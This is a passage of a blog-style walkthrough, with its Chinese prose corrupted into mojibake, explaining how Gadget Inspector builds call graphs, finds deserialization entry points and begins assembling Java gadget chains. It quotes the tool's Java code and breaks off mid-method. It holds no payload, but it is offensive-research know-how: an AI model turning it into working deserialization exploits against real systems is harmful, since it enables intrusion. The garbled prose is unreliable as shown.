<h4 id="æ„é€ è°ƒç”¨å›¾"><a href="#æ„é€ è°ƒç”¨å›¾" class="headerlink" title="æ„é€ è°ƒç”¨å›¾"></a>æ„é€ è°ƒç”¨å›¾</h4><p>ä¸Šä¸€æ­¥çš„ passthroughDataflowç”Ÿæˆæ˜¯å®è§‚çš„æ–¹æ³•å‚æ•°ä¸è¿”å›å€¼çš„å…³ç³»å¹¶æ²¡æœ‰å…³ç³»åˆ°æ–¹æ³•å†…éƒ¨çš„æ±¡æŸ“å…³ç³»ï¼Œè‹¥è¦å½¢æˆ Gadgets é“¾è¿˜éœ€ç¡®å®šçˆ¶æ–¹æ³•ä¸å­æ–¹æ³•ä¹‹é—´çš„å‚æ•°ä¼ é€’å…³ç³»ã€‚<br>è¿™ä¸€æ­¥ä¸»è¦æ˜¯åˆ†ææ–¹æ³•çš„å‚æ•°ä¸å…¶è°ƒç”¨çš„å­æ–¹æ³•ä¹‹é—´çš„å…³ç³»ï¼Œå³å­æ–¹æ³•çš„å‚æ•°æ˜¯å¦ä¼šè¢«å…¶çˆ¶æ–¹æ³•çš„å‚æ•°æ‰€æ±¡æŸ“ã€‚<br>å› ä¸ºæ¶‰åŠåˆ°æ–¹æ³•å†…éƒ¨çš„ç»†èŠ‚å¤„ç†ï¼Œæ‰€ä»¥è¿™é‡Œä»ç„¶éœ€è¦ä½¿ç”¨ MethodVisitorï¼Œ å¯¹åº”çš„æ–¹æ³•è®¿é—®å™¨å®ç°ç±»ä¸º ModelGeneratorMethodVisitorã€‚<br>ModelGeneratorMethodVisitor ä¹Ÿæ˜¯ç»§æ‰¿è‡ª TaintTrackingMethodVisitorï¼Œå…¶å•ç‹¬é‡å†™äº†visitCode visitFieldInsn ä»¥åŠ visitMethodInsn æ–¹æ³•ã€‚  </p>
<p>è¯¥æ–¹æ³•æ•´ä½“æµç¨‹ä¸æ•°æ®ä¼ æ’­æµå›¾åˆ†ææ—¶çš„ visitCode æ–¹æ³•ä¸€è‡´ï¼ŒåŒºåˆ«åœ¨äºå±€éƒ¨å˜é‡è¡¨ä¸­å­˜å‚¨çš„æ•°æ®ã€‚æ•°æ®æµå›¾åˆ†ææ—¶å±€éƒ¨å˜é‡è¡¨ä¸­å­˜å‚¨çš„æ˜¯å‚æ•°çš„ç´¢å¼•ï¼Œ<br>æ­¤æ—¶å­˜å‚¨çš„æ˜¯ä¸€ä¸ªä»¥<code>arg</code>å¼€å¤´å¹¶è¿½åŠ å‚æ•°ç´¢å¼•çš„å­—ç¬¦ä¸²ï¼Œå¦‚ï¼šarg0ï¼Œarg1ã€‚è¿™æ ·åšçš„ç›®çš„åœ¨äºåˆ†æçˆ¶æ–¹æ³•ä¸è¢«è°ƒç”¨å­æ–¹æ³•ä¹‹é—´çš„å½¢å‚ä¼ é€’æ—¶ï¼Œ<br>èƒ½å¤Ÿé€šè¿‡æ£€æŸ¥å­æ–¹æ³•çš„å‚æ•°å€¼æ˜¯å¦ä»¥<code>arg</code> æ¥å¤´æ¥åˆ¤æ–­çˆ¶æ–¹æ³•çš„å½¢å‚æ˜¯å¦ä¼ é€’åˆ°äº†å­æ–¹æ³•ä¸­ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitCode</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>.visitCode();</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">localIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">argIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="built_in">this</span>.access &amp; Opcodes.ACC_STATIC) == <span class="number">0</span>) &#123;</span><br><span class="line">                setLocalTaint(localIndex, <span class="string">&quot;arg&quot;</span> + argIndex);</span><br><span class="line">                localIndex += <span class="number">1</span>;</span><br><span class="line">                argIndex += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (Type argType : Type.getArgumentTypes(desc)) &#123;</span><br><span class="line">                setLocalTaint(localIndex, <span class="string">&quot;arg&quot;</span> + argIndex);</span><br><span class="line">                localIndex += argType.getSize();</span><br><span class="line">                argIndex += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>é’ˆå¯¹å­—æ®µè®¿é—®ç›¸å…³çš„å­—èŠ‚ç æŒ‡ä»¤è¿›è¡Œå¤„ç†ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitFieldInsn</span><span class="params">(<span class="type">int</span> opcode, String owner, String name, String desc)</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">                <span class="keyword">case</span> Opcodes.GETSTATIC:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> Opcodes.PUTSTATIC:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> Opcodes.GETFIELD:</span><br><span class="line">                    <span class="type">Type</span> <span class="variable">type</span> <span class="operator">=</span> Type.getType(desc);</span><br><span class="line">                    <span class="keyword">if</span> (type.getSize() == <span class="number">1</span>) &#123;</span><br><span class="line">                        <span class="type">Boolean</span> <span class="variable">isTransient</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// If a field type could not possibly be serialized, it&#x27;s effectively transient</span></span><br><span class="line">                        <span class="keyword">if</span> (!couldBeSerialized(serializableDecider, inheritanceMap, <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(type.getInternalName()))) &#123;</span><br><span class="line">                            isTransient = Boolean.TRUE;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="type">ClassReference</span> <span class="variable">clazz</span> <span class="operator">=</span> classMap.get(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(owner));</span><br><span class="line">                            <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                                <span class="keyword">for</span> (ClassReference.Member member : clazz.getMembers()) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> (member.getName().equals(name)) &#123;</span><br><span class="line">                                        isTransient = (member.getModifiers() &amp; Opcodes.ACC_TRANSIENT) != <span class="number">0</span>;</span><br><span class="line">                                        <span class="keyword">break</span>;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">if</span> (isTransient != <span class="literal">null</span>) &#123;</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                clazz = classMap.get(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(clazz.getSuperClass()));</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        Set&lt;String&gt; newTaint = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">                        <span class="keyword">if</span> (!Boolean.TRUE.equals(isTransient)) &#123;</span><br><span class="line">                            <span class="comment">// æ ˆé¡¶æ”¾çš„æ—¶å¯¹è±¡çš„å¼•ç”¨ æ„é€ æ±¡ç‚¹æ ‡è¯†ç¬¦</span></span><br><span class="line">                            <span class="comment">// å¦‚æœå¯¹è±¡æ¥è‡ªçˆ¶æ–¹æ³•çš„å…¥å‚ åˆ™ s ä¸º arg1.fieldName</span></span><br><span class="line">                            <span class="keyword">for</span> (String s : getStackTaint(<span class="number">0</span>)) &#123;</span><br><span class="line">                                newTaint.add(s + <span class="string">&quot;.&quot;</span> + name);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// æ¨¡æ‹Ÿæ“ä½œæ•°æ ˆå˜åŒ–</span></span><br><span class="line">                        <span class="built_in">super</span>.visitFieldInsn(opcode, owner, name, desc);</span><br><span class="line">                        <span class="comment">// å°†å–å­—æ®µçš„ç»“æœæ”¾å…¥åˆ°æ ˆé¡¶ å³ arg1.fieldName</span></span><br><span class="line">                        setStackTaint(<span class="number">0</span>, newTaint);</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> Opcodes.PUTFIELD:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unsupported opcode: &quot;</span> + opcode);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// æ¨¡æ‹Ÿæ“ä½œæ•°æ ˆå˜åŒ–</span></span><br><span class="line">            <span class="built_in">super</span>.visitFieldInsn(opcode, owner, name, desc);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>é’ˆå¯¹æ–¹æ³•è®¿é—®è¿›è¡Œå¤„ç†  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitMethodInsn</span><span class="params">(<span class="type">int</span> opcode, String owner, String name, String desc, <span class="type">boolean</span> itf)</span> &#123;</span><br><span class="line">            Type[] argTypes = Type.getArgumentTypes(desc);</span><br><span class="line">            <span class="keyword">if</span> (opcode != Opcodes.INVOKESTATIC) &#123;</span><br><span class="line">                Type[] extendedArgTypes = <span class="keyword">new</span> <span class="title class_">Type</span>[argTypes.length+<span class="number">1</span>];</span><br><span class="line">                System.arraycopy(argTypes, <span class="number">0</span>, extendedArgTypes, <span class="number">1</span>, argTypes.length);</span><br><span class="line">                extendedArgTypes[<span class="number">0</span>] = Type.getObjectType(owner);</span><br><span class="line">                argTypes = extendedArgTypes;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">                <span class="keyword">case</span> Opcodes.INVOKESTATIC:</span><br><span class="line">                <span class="keyword">case</span> Opcodes.INVOKEVIRTUAL:</span><br><span class="line">                <span class="keyword">case</span> Opcodes.INVOKESPECIAL:</span><br><span class="line">                <span class="keyword">case</span> Opcodes.INVOKEINTERFACE:</span><br><span class="line">                    <span class="type">int</span> <span class="variable">stackIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; argTypes.length; i++) &#123;</span><br><span class="line">                        <span class="type">int</span> <span class="variable">argIndex</span> <span class="operator">=</span> argTypes.length-<span class="number">1</span>-i;</span><br><span class="line">                        <span class="type">Type</span> <span class="variable">type</span> <span class="operator">=</span> argTypes[argIndex];</span><br><span class="line">                        <span class="comment">// æ­¤æ—¶ä»æ ˆé¡¶å‘ä¸‹çš„æ•°æ®å‡ä¸ºè¢«è°ƒç”¨æ–¹æ³•çš„å…¥å‚</span></span><br><span class="line">                        <span class="comment">// æ ¹æ®æ ˆç´¢å¼•ä»æ ˆä¸Šå–å¾—å‚æ•°</span></span><br><span class="line">                        Set&lt;String&gt; taint = getStackTaint(stackIndex);</span><br><span class="line">                        <span class="comment">// å¦‚æœè¯¥å‚æ•°æœ‰æ±¡ç‚¹æ ‡è¯†ç¬¦ </span></span><br><span class="line">                        <span class="keyword">if</span> (taint.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="comment">// éå†æ±¡ç‚¹æ ‡è¯†ç¬¦</span></span><br><span class="line">                            <span class="keyword">for</span> (String argSrc : taint) &#123;</span><br><span class="line">                                <span class="comment">// å¦‚æœå‚æ•°çš„æ±¡ç‚¹æ ‡è¯†ç¬¦ ä¸æ˜¯argå¼€å¤´ åˆ™ç›´æ¥æŠ¥é”™é€€å‡ºï¼Œå³è°ƒç”¨æ–¹æ³•çš„å‚æ•°æ— æ³•å½±å“è¢«è°ƒç”¨æ–¹æ³•çš„å…¥å‚</span></span><br><span class="line">                                <span class="comment">// è¿™é‡Œç›´æ¥æŠ›å‡ºå¼‚å¸¸ æ˜¯å¦å­˜åœ¨é—®é¢˜</span></span><br><span class="line">                                <span class="comment">// ç¬¬ä¸€ä¸ªå‚æ•°ä¸è¢«å—ä¸»è°ƒæ–¹æ³•å…¥å‚å½±å“ï¼Œç›´æ¥é€€å‡ºé’ˆå¯¹è¯¥æ–¹æ³•çš„åˆ†æï¼Œé‚£ä¹ˆç¬¬äºŒä¸ªå‚æ•°å¦‚æœå—å½±å“å‘¢ï¼Ÿ</span></span><br><span class="line">                                <span class="keyword">if</span> (!argSrc.substring(<span class="number">0</span>, <span class="number">3</span>).equals(<span class="string">&quot;arg&quot;</span>)) &#123;</span><br><span class="line">                                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid taint arg: &quot;</span> + argSrc);</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="comment">// ç¡®å®š`.`å·çš„ä½ç½®</span></span><br><span class="line">                                <span class="comment">// </span></span><br><span class="line">                                <span class="type">int</span> <span class="variable">dotIndex</span> <span class="operator">=</span> argSrc.indexOf(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">                                <span class="type">int</span> srcArgIndex;</span><br><span class="line">                                String srcArgPath;</span><br><span class="line">                                <span class="comment">// å¦‚æœç‚¹å·ä¸å­˜åœ¨åˆ™è¯æ˜è¢«è°ƒç”¨æ–¹æ³•çš„æ±¡ç‚¹æ ‡è¯†ç¬¦ç”±è°ƒç”¨æ–¹æ³•çš„å‚æ•°ç›´æ¥ä¼ é€’</span></span><br><span class="line">                                <span class="keyword">if</span> (dotIndex == -<span class="number">1</span>) &#123;</span><br><span class="line">                                    <span class="comment">// è®¡ç®—å‚æ•°ç´¢å¼•</span></span><br><span class="line">                                    srcArgIndex = Integer.parseInt(argSrc.substring(<span class="number">3</span>));</span><br><span class="line">                                    <span class="comment">// å‚æ•°è·¯å¾„ä¸ºç©º </span></span><br><span class="line">                                    srcArgPath = <span class="literal">null</span>;</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    <span class="comment">// è®¡ç®—å‚æ•°ç´¢å¼• å› ä¸ºå­˜åœ¨ç‚¹å· è¯æ˜è¯¥å‚æ•°ç”±å¯¹è±¡é—´æ¥ä¼ é€’ éç›´æ¥ä¼ é€’</span></span><br><span class="line">                                    srcArgIndex = Integer.parseInt(argSrc.substring(<span class="number">3</span>, dotIndex));</span><br><span class="line">                                    <span class="comment">// è®°å½•è¢«è°ƒç”¨æ–¹æ³•çš„å‚æ•°æ¥è‡ªä¸»è°ƒæ–¹æ³•çš„å‚æ•°çš„å“ªä¸ªå±æ€§</span></span><br><span class="line">                                    srcArgPath = argSrc.substring(dotIndex+<span class="number">1</span>);</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="comment">// æ„é€ è°ƒç”¨å›¾</span></span><br><span class="line">                                <span class="comment">// ä¸»è°ƒæ–¹æ³•å¥æŸ„  è¢«è°ƒç”¨æ–¹æ³•å¥æŸ„   ä¸»è°ƒæ–¹æ³•å‚æ•°ç´¢å¼• ä¸»è°ƒæ–¹æ³•å‚æ•°ä¼ é€’è·¯å¾„  è¢«è°ƒæ–¹æ³•å‚æ•°ç´¢å¼•</span></span><br><span class="line">                                discoveredCalls.add(<span class="keyword">new</span> <span class="title class_">GraphCall</span>(</span><br><span class="line">                                        <span class="keyword">new</span> <span class="title class_">MethodReference</span>.Handle(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(<span class="built_in">this</span>.owner), <span class="built_in">this</span>.name, <span class="built_in">this</span>.desc),</span><br><span class="line">                                        <span class="keyword">new</span> <span class="title class_">MethodReference</span>.Handle(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(owner), name, desc),</span><br><span class="line">                                        srcArgIndex,</span><br><span class="line">                                        srcArgPath,</span><br><span class="line">                                        argIndex));</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// å¢åŠ æ ˆç´¢å¼• ç»§ç»­è·å–ä¸‹ä¸€ä¸ªå‚æ•°</span></span><br><span class="line">                        stackIndex += type.getSize();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unsupported opcode: &quot;</span> + opcode);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">super</span>.visitMethodInsn(opcode, owner, name, desc, itf);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>å½¢æˆçš„æ–¹æ³•é—´è°ƒç”¨å›¾å°†è¢«å­˜å‚¨åœ¨ CallGraphDiscovery.discoveredCalls å­—æ®µä¸­ï¼Œæœ€ç»ˆè¢«æŒä¹…åŒ–åˆ° callgraph.dat æ–‡ä»¶ä¸­ã€‚å­˜å‚¨æ ¼å¼å¦‚ä¸‹<br>ä¸»è°ƒæ–¹æ³•æ‰€å±ç±»å…¨ç±»å|ä¸»è°ƒæ–¹æ³•å|ä¸»è°ƒæ–¹æ³•æè¿°ç¬¦|è¢«è°ƒæ–¹æ³•æ‰€å±ç±»å…¨ç±»å|è¢«è°ƒæ–¹æ³•å|è¢«è°ƒæ–¹æ³•æè¿°ç¬¦|ä¸»è°ƒæ–¹æ³•å‚æ•°ç´¢å¼•|ä¸»è°ƒæ–¹æ³•å‚æ•°ä¼ é€’è·¯å¾„|è¢«è°ƒæ–¹æ³•å‚æ•°ç´¢å¼•<br>å¦‚ï¼š<br>com&#x2F;sun&#x2F;org&#x2F;apache&#x2F;xerces&#x2F;internal&#x2F;impl&#x2F;dtd&#x2F;XMLDTDDescription	<init>	(Lcom&#x2F;sun&#x2F;org&#x2F;apache&#x2F;xerces&#x2F;internal&#x2F;xni&#x2F;XMLResourceIdentifier;Ljava&#x2F;lang&#x2F;String;)V	com&#x2F;sun&#x2F;org&#x2F;apache&#x2F;xerces&#x2F;internal&#x2F;xni&#x2F;XMLResourceIdentifier	getBaseSystemId	()Ljava&#x2F;lang&#x2F;String;	1		0<br>æˆ‘ä»¬çœ‹ XMLDTDDescription å¯¹åº”çš„æ„é€ å‡½æ•°ï¼Œè¢«è°ƒç”¨çš„å­æ–¹æ³•æ˜¯ id.getBaseSystemId()ã€‚getBaseSystemIdçš„è°ƒç”¨è€…idæ¥è‡ª XMLDTDDescription æ„é€ å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œ<br>å³ç´¢å¼•1ã€‚getLiteralSystemId ä¹Ÿæœ‰ä¸€ä¸ªå‚æ•° this, ç´¢å¼•ä¸º0ã€‚ XMLDTDDescriptionçš„ç¬¬ä¸€ä¸ªå‚æ•°å°†å½±å“ getBaseSystemId æ–¹æ³•çš„ç¬¬0ä¸ªå‚æ•°ä¸”æ˜¯ç›´æ¥å½±å“å¹¶æ— å‚æ•°è·¯å¾„ã€‚<br>æ•…å½¢æˆçš„æ±¡æŸ“è·¯å¾„ä¸º <code>1		0</code>   </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">XMLDTDDescription</span><span class="params">(XMLResourceIdentifier id, String rootName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.setValues(id.getPublicId(), id.getLiteralSystemId(), id.getBaseSystemId(), id.getExpandedSystemId());</span><br><span class="line">        <span class="built_in">this</span>.fRootName = rootName;</span><br><span class="line">        <span class="built_in">this</span>.fPossibleRoots = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h4 id="Source-ç‚¹æ¢æµ‹"><a href="#Source-ç‚¹æ¢æµ‹" class="headerlink" title="Source ç‚¹æ¢æµ‹"></a>Source ç‚¹æ¢æµ‹</h4><p>ä¸åŒçš„ååºåˆ—åŒ–ç±»å‹å…·æœ‰ä¸åŒçš„å…¥å£ï¼ŒGadget Inspector é»˜è®¤æä¾›äº†ä¸¤ç§ç±»å‹çš„å…¥å£ç‚¹æ¢æµ‹ç±»ï¼Œåˆ†åˆ«æ˜¯ JacksonSourceDiscovery ä»¥åŠ SimpleSourceDiscoveryã€‚<br>æˆ‘ä»¬ä»¥æœ€å¸¸ç”¨çš„JavaåŸç”Ÿååºåˆ—åŒ–ä¸ºä¾‹ï¼Œå³ SimpleSourceDiscoveryã€‚<br>é€»è¾‘å°±æ˜¯æ ¹æ®å·²çŸ¥çš„ååºåˆ—åŒ–å…¥å£ç‚¹å–åŒ¹é…è¢«æ¢æµ‹çš„æ–¹æ³•ï¼Œç„¶åå½¢æˆä¸€ä¸ªåˆ—è¡¨ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">discover</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span></span><br><span class="line"><span class="params">                         Map&lt;MethodReference.Handle, MethodReference&gt; methodMap,</span></span><br><span class="line"><span class="params">                         InheritanceMap inheritanceMap)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">SerializableDecider</span> <span class="variable">serializableDecider</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleSerializableDecider</span>(inheritanceMap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123;</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;finalize&quot;</span>) &amp;&amp; method.getDesc().equals(<span class="string">&quot;()V&quot;</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> <span class="title class_">Source</span>(method, <span class="number">0</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If a class implements readObject, the ObjectInputStream passed in is considered tainted</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123;</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;readObject&quot;</span>) &amp;&amp; method.getDesc().equals(<span class="string">&quot;(Ljava/io/ObjectInputStream;)V&quot;</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> <span class="title class_">Source</span>(method, <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Using the proxy trick, anything extending serializable and invocation handler is tainted.</span></span><br><span class="line">        <span class="keyword">for</span> (ClassReference.Handle clazz : classMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(clazz))</span><br><span class="line">                    &amp;&amp; inheritanceMap.isSubclassOf(clazz, <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(<span class="string">&quot;java/lang/reflect/InvocationHandler&quot;</span>))) &#123;</span><br><span class="line">                MethodReference.<span class="type">Handle</span> <span class="variable">method</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodReference</span>.Handle(</span><br><span class="line">                        clazz, <span class="string">&quot;invoke&quot;</span>, <span class="string">&quot;(Ljava/lang/Object;Ljava/lang/reflect/Method;[Ljava/lang/Object;)Ljava/lang/Object;&quot;</span>);</span><br><span class="line"></span><br><span class="line">                addDiscoveredSource(<span class="keyword">new</span> <span class="title class_">Source</span>(method, <span class="number">0</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// hashCode() or equals() are accessible entry points using standard tricks of putting those objects</span></span><br><span class="line">        <span class="comment">// into a HashMap.</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123;</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;hashCode&quot;</span>) &amp;&amp; method.getDesc().equals(<span class="string">&quot;()I&quot;</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> <span class="title class_">Source</span>(method, <span class="number">0</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; method.getDesc().equals(<span class="string">&quot;(Ljava/lang/Object;)Z&quot;</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> <span class="title class_">Source</span>(method, <span class="number">0</span>));</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> <span class="title class_">Source</span>(method, <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Using a comparator proxy, we can jump into the call() / doCall() method of any groovy Closure and all the</span></span><br><span class="line">        <span class="comment">// args are tainted.</span></span><br><span class="line">        <span class="comment">// https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Groovy1.java</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))</span><br><span class="line">                    &amp;&amp; inheritanceMap.isSubclassOf(method.getClassReference(), <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(<span class="string">&quot;groovy/lang/Closure&quot;</span>))</span><br><span class="line">                    &amp;&amp; (method.getName().equals(<span class="string">&quot;call&quot;</span>) || method.getName().equals(<span class="string">&quot;doCall&quot;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">                addDiscoveredSource(<span class="keyword">new</span> <span class="title class_">Source</span>(method, <span class="number">0</span>));</span><br><span class="line">                Type[] methodArgs = Type.getArgumentTypes(method.getDesc());</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; methodArgs.length; i++) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> <span class="title class_">Source</span>(method, i + <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>æœ€ç»ˆå½¢æˆçš„sourceç‚¹åˆ—è¡¨å°†è¢«æŒä¹…åŒ–å­˜å‚¨åœ¨ sources.dat æ–‡ä»¶ä¸­ã€‚æ–‡ä»¶æ ¼å¼å¦‚ä¸‹ï¼š<br>æ–¹æ³•æ‰€å±ç±»å…¨ç±»å|æ–¹æ³•å|æ–¹æ³•æè¿°|æ±¡ç‚¹å‚æ•°ç´¢å¼•  </p>
<h4 id="Gadget-Chain-æ„é€ "><a href="#Gadget-Chain-æ„é€ " class="headerlink" title="Gadget Chain æ„é€ "></a>Gadget Chain æ„é€ </h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">discover</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();</span><br><span class="line">        <span class="type">InheritanceMap</span> <span class="variable">inheritanceMap</span> <span class="operator">=</span> InheritanceMap.load();</span><br><span class="line">        <span class="comment">// æŸ¥æ‰¾æ–¹æ³•çš„æ‰€æœ‰å®ç°</span></span><br><span class="line">        Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap = InheritanceDeriver.getAllMethodImplementations(</span><br><span class="line">                inheritanceMap, methodMap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">ImplementationFinder</span> <span class="variable">implementationFinder</span> <span class="operator">=</span> config.getImplementationFinder(</span><br><span class="line">                methodMap, methodImplMap, inheritanceMap);</span><br><span class="line">        <span class="comment">// æŒä¹…åŒ–</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">Writer</span> <span class="variable">writer</span> <span class="operator">=</span> Files.newBufferedWriter(Paths.get(<span class="string">&quot;methodimpl.dat&quot;</span>))) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Map.Entry&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; entry : methodImplMap.entrySet()) &#123;</span><br><span class="line">                writer.write(entry.getKey().getClassReference().getName());</span><br><span class="line">                writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                writer.write(entry.getKey().getName());</span><br><span class="line">                writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                writer.write(entry.getKey().getDesc());</span><br><span class="line">                writer.write(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                <span class="keyword">for</span> 